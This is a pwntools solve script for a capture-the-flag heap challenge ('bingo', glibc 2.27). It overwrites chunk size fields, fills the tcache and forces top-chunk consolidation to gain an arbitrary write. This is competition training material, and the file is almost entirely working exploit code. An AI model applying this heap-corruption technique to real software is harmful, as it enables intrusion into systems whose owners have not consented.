#!/usr/bin/env python3

from pwn import *

elf = ELF("./bingo_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        if args.TEST:
            r = remote('localhost', 1907)
        else:
            r = remote('bin-go.challs.olicyber.it', 18000)
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b *challenge+51
                                ignore 1 26
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r

def alloc(io, size: int, data: bytes, new_line: bool = True):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'> ', str(size).encode())
    if new_line:
        io.sendlineafter(b'> ', data)
    else:
        io.sendafter(b'> ', data)
    
def free(io):
    io.sendlineafter(b'> ', b'2')
    
def check(io):
    io.sendlineafter(b'> ', b'3')


def main():
    r = conn()
    # fill tcache for 0x140 chunks (0x140 is the offset from the last 0xb0 chunk to the top chunk, and also it is big enough to not go into fastbins)
    alloc(r, 0x18, b'a'*0x18 + p64(0x141), new_line=False)
    alloc(r, 0x18, b'a'*0x18 + p64(0x141), new_line=False)
    free(r)
    free(r)
    
    alloc(r, 0x28, b'a'*0x28 + p64(0x141), new_line=False)
    alloc(r, 0x28, b'a'*0x28 + p64(0x141), new_line=False)
    free(r)
    free(r)
    
    alloc(r, 0x38, b'a'*0x38 + p64(0x141), new_line=False)
    alloc(r, 0x38, b'a'*0x38 + p64(0x141), new_line=False)
    free(r)
    free(r)
    
    alloc(r, 0x48, b'a'*0x48 + p64(0x141), new_line=False)
    alloc(r, 0x48, b'a'*0x48 + p64(0x141), new_line=False)
    free(r)
    free(r)
    # at this point the 0x140 tcache bin has been filled
    
    alloc(r, 0xa8, b'')
    alloc(r, 0xa8, b'a'*0xa8 + p64(0x141), new_line=False)
    free(r)
    free(r)
    
    # at this point the top chunk will have consolidated backwards to the freed 0x140 chunk (ex last 0xb0 chunk)
    alloc(r, 0x48, b'')
    alloc(r, 0x48, b'')
    free(r)
    free(r)
    alloc(r, 0x38, b'')
    alloc(r, 0x38, p64(0xdeadbeefdeadbeef)*7, new_line=False) # this will write where target points
    
    check(r)
    r.interactive()

if __name__ == "__main__":
    main()
